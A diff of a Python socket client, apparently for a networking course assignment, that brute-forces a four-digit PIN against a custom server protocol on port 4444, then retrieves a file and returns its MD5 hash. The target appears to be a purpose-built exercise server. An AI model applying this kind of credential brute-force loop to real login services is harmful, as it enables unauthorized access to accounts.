@@ -1,4 +1,3 @@
-from http import client
 from socket import *
 import sys, hashlib, time
 
@@ -7,49 +6,64 @@ serverPort = 4444
 student_id = 283974
 clientSocket = socket(AF_INET, SOCK_STREAM) 
 password = 0
+passed = 0
 
 def main():
     
     if (len(sys.argv) != 2):
-        print("expected 1 argument!")
-        return
+        print("Expected 1 argument!")
+        return -1
 
-    #clientSocket = socket(AF_INET, SOCK_STREAM)
     start_time = time.time()
-    clientSocket.connect((targetServer, serverPort))
-    print("connection established")
     student_key = sys.argv[1]
-    if (handshake(student_key)):
-        while (password < 10000):
+    
+    while (password < 10000):
+        if (establishConnection(student_key)):
             try_password()
+            clientSocket.close()
 
-        print("--------- %s seconds ------------" % (time.time() - start_time))
-    else :
-        print("handshake failed")
+        else:
+            print("ERR: handshake failed")
+
+    print("---------OVERALL %s seconds ------------" % (time.time() - start_time))
+    print("OVERALL PASSED %s / 8" % passed)
+    return 0
         
+
+def establishConnection(student_key):
+    global clientSocket
+    clientSocket = socket(AF_INET, SOCK_STREAM)
+    clientSocket.connect((targetServer, serverPort))
+    print("SYSTEM: socket established")
+    return handshake(student_key)
+
 
 def handshake(student_key):
     message = ("STID_" + student_key).encode()
-    print("sending message: ", message)
+    print("SYSTEM: Handshaking with ", message)
     clientSocket.send(message)
     reply = clientSocket.recv(4).decode()
-    print("server:", reply)
     return reply == '200_'
 
 def try_password():
+    global password
+    print("SYSTEM: Starting with ", password)
     start_time = time.time()
+    
     for i in range(password, 10000):
+        password += 1
         fourDigit = '{0:04}'.format(i)
         m = ('LGIN_' + fourDigit).encode()
         clientSocket.send(m)
         response = getResponseCode()
         if (response == '201_'):
-            print('password is: ', fourDigit)
+            print('\nSUCCESS: Password is ', fourDigit, " Now in State 2")
             file = getFile()
-            print("file retrieved: ", hashlib.md5(file).hexdigest())
-            send_hash(file)
+            digest = hashlib.md5(file).hexdigest()
+            print("SUCCESS: File retrieved: ", digest)
+            send_hash(digest)
             logoutFile()
-            
+
         elif (response == '403_'):
             continue
         else:
@@ -57,34 +71,39 @@ def try_password():
             print("ERR: curr iteration: ", i)
             password = i
             break
+            
     print("------------- bruteforced in %s seconds--------------" % (time.time() - start_time)) 
 
-def send_hash(file):
-    hash = hashlib.md5(file).hexdigest()
+def send_hash(hash):
+    global passed
     msg = ('PUT__' + hash).encode()
+    #print("sending hash")
     clientSocket.send(msg)
+    #print("awaiting verification")
     code = getResponseCode()
     if (code == '203_'):
-        hashlib.md5(readLength(extractLength())).hexdigest()
+        #length = extractLength()
+        #print("length: ", length)
+        print("SUCCESS: hash accepted ") #hashlib.md5(readLength(length)).hexdigest())
+        passed += 1
     else:
-        print("ERR: sent has invalid, server returned ", code)
+        print("ERR: Hash invalid, server returned ", code)
     
 
 def logoutFile():
-    print('logging out')
+    print('SYSTEM: logging out')
     clientSocket.send('LOUT_'.encode())
     if (getResponseCode() == '202_'):
-        print('server: Logout successful, now in State 1')
+        print('SYSTEM: Logout successful, now in State 1 \n')
     else:
-        print('ERR: logout failed')
+        print('ERR: Logout failed')
 
 def getFile():
     clientSocket.send('GET__'.encode())
-    print("getting file")
+    print("SYSTEM: Getting file")
     if (getResponseCode() == '100_'):
-        print("server: 100_")
         length = extractLength()
-        print("server: file length is", length)
+        print("Server: File length is", length)
         file = readLength(length)
         return file
     else:
@@ -109,7 +128,6 @@ def extractLength():
         buffer = buffer + msgByte
     
     return int(buffer.decode())
-        
 
 
 def getResponseCode():
@@ -118,6 +136,11 @@ def getResponseCode():
         print('RESPONSE_CODE not length 4')
     
     return m.decode()
+
+def work(amount):
+    c = 0
+    for i in range(amount):
+        c += 1
 
 if __name__ == "__main__":
     main()
